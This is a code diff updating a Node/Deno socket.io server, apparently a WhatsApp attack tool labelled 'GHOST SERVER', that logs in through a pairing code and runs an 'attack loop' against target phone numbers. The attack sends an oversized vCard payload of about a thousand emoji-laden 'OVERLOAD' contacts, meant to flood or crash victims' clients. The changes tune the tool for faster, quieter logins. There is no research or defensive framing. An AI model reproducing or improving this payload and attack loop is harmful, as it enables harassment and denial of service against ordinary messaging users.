@@ -1,5 +1,5 @@
 // stateless_server.js
-// VERSION: GHOST-V4-STABILITY-FIX
+// VERSION: GHOST-V5-FAST-LOGIN
 // TIMESTAMP: ${new Date().toISOString()}
 
 import { Server } from "npm:socket.io";
@@ -19,7 +19,7 @@ import pino from 'npm:pino';
 
 const httpServer = createServer((req, res) => {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
-    res.end('MALXGMN GHOST SERVER V4 (STABLE) IS RUNNING');
+    res.end('MALXGMN GHOST SERVER V5 (FAST LOGIN) IS RUNNING');
 });
 
 const io = new Server(httpServer, {
@@ -29,12 +29,12 @@ const io = new Server(httpServer, {
     }
 });
 
-// GLOBAL VARS
 let activeSock = null;
 let isAttacking = false;
 let socketInitializing = false;
+let keepAliveInterval = null;
 
-// AUTH HELPER (Memory Only)
+// AUTH HELPER
 const useSocketAuthState = async (socket, initialData) => {
     const creds = initialData?.creds 
         ? JSON.parse(JSON.stringify(initialData.creds), BufferJSON.reviver) 
@@ -85,7 +85,12 @@ const useSocketAuthState = async (socket, initialData) => {
 io.on("connection", (socket) => {
     console.log(`[+] Client Connected: ${socket.id}`);
 
-    // RESET COMMAND
+    // KEEP ALIVE PING (Prevent Deno Sleep during Login)
+    if (keepAliveInterval) clearInterval(keepAliveInterval);
+    keepAliveInterval = setInterval(() => {
+        socket.emit("ping", "keep-alive");
+    }, 5000);
+
     socket.on("force_reset", async () => {
         if (activeSock) {
             try { activeSock.end(undefined); } catch {}
@@ -93,11 +98,9 @@ io.on("connection", (socket) => {
         }
         socketInitializing = false;
         socket.emit("status", "Server Reset. Re-initializing...");
-        // Client should emit init_session again
     });
 
     socket.on("init_session", async (rawSessionJson) => {
-        // Prevent double init
         if (socketInitializing) return;
         socketInitializing = true;
 
@@ -111,9 +114,9 @@ io.on("connection", (socket) => {
             if (rawSessionJson) {
                 try {
                     initialData = JSON.parse(rawSessionJson, BufferJSON.reviver);
-                    console.log("[✔] Session loaded from client");
+                    console.log("[✔] Session loaded");
                 } catch (e) {
-                    console.log("[-] Invalid JSON session");
+                    console.log("[-] Invalid Session");
                 }
             } 
             await startSock(socket, initialData);
@@ -127,20 +130,17 @@ io.on("connection", (socket) => {
 
     socket.on("use_pairing_code", async (phoneNumber) => {
         if (!activeSock) {
-            return socket.emit("error", "WA Engine not ready. Wait 5 seconds.");
+            return socket.emit("error", "WA Engine loading... Wait 5s.");
         }
         try {
-            console.log(`[*] Requesting pairing code for ${phoneNumber}`);
-            
-            // Wait a bit to ensure socket is stable
+            console.log(`[*] Pairing: ${phoneNumber}`);
             await delay(2000); 
-
             const code = await activeSock.requestPairingCode(phoneNumber);
-            console.log(`[+] Code Generated: ${code}`);
+            console.log(`[+] Code: ${code}`);
             socket.emit("pairing_code", code);
         } catch (e) {
             console.error("Pairing Error:", e);
-            socket.emit("error", "Pairing Failed. Restart App. " + e.message);
+            socket.emit("error", "Pairing Failed. Try again.");
         }
     });
 
@@ -153,6 +153,10 @@ io.on("connection", (socket) => {
         isAttacking = false;
         socket.emit("status", "Attack Stopped");
     });
+    
+    socket.on("disconnect", () => {
+        if (keepAliveInterval) clearInterval(keepAliveInterval);
+    });
 });
 
 async function startSock(socket, initialData) {
@@ -161,16 +165,17 @@ async function startSock(socket, initialData) {
 
     const sock = makeWASocket({
         version,
-        logger: pino({ level: 'silent' }),
+        logger: pino({ level: 'silent' }), // ULTRA SILENT
         printQRInTerminal: false,
         auth: {
             creds: state.creds,
             keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
         },
-        // Ubuntu/Chrome is stable for Pairing Code
-        browser: ["Ubuntu", "Chrome", "20.0.04"], 
-        generateHighQualityLinkPreview: true,
-        // Increase timeout for Deno environment
+        // LIGHTWEIGHT BROWSER CONFIG
+        browser: ["Mac OS", "Chrome", "10.15.7"], 
+        generateHighQualityLinkPreview: false, // DISABLE HEAVY FEATURE
+        syncFullHistory: false, // DISABLE HISTORY SYNC (FASTER LOGIN)
+        markOnlineOnConnect: true,
         connectTimeoutMs: 60000, 
     });
 
@@ -181,7 +186,7 @@ async function startSock(socket, initialData) {
         const { connection, lastDisconnect, qr } = update;
 
         if (qr) {
-            console.log("[QR] QR Generated");
+            console.log("[QR] Generated");
             socket.emit('qr', qr);
         }
 
@@ -193,8 +198,7 @@ async function startSock(socket, initialData) {
             console.log(`[!] Closed. Reconnect: ${shouldReconnect}`);
 
             if (shouldReconnect) {
-                // Delay reconnection slightly to avoid spam loop
-                setTimeout(() => startSock(socket, initialData), 3000);
+                setTimeout(() => startSock(socket, initialData), 2000);
             } else {
                 socket.emit('logged_out', 'Session Invalidated');
                 activeSock = null;
@@ -212,7 +216,7 @@ async function runAttackLoop(socket, rawTargets) {
     isAttacking = true;
     const targetJids = rawTargets.map(t => t.replace(/[^0-9]/g, '') + '@s.whatsapp.net');
     
-    // PAYLOADS (Unicode Safe)
+    // PAYLOADS
     const _f = "\\uD83D\\uDD25"; 
     const _s = "\\u2620\\uFE0F"; 
     const _b = "\\uD83D\\uDCA3"; 
@@ -222,8 +226,9 @@ async function runAttackLoop(socket, rawTargets) {
     const vcardHeader = 'BEGIN:VCARD\nVERSION:3.0\nFN:';
     const vcardFooter = '\nTEL;type=CELL;waid=0:0\nEND:VCARD\n';
     
-    for(let i=0; i<1500; i++) {
-        heavyVcardContent += vcardHeader + _f.repeat(10) + 'OVERLOAD_' + i + vcardFooter;
+    // Reduced payload size for stability
+    for(let i=0; i<1000; i++) {
+        heavyVcardContent += vcardHeader + _f.repeat(5) + 'OVERLOAD_' + i + vcardFooter;
     }
     
     const vcardPayload = { contacts: { displayName: _s, contacts: [{ vcard: heavyVcardContent }] } };
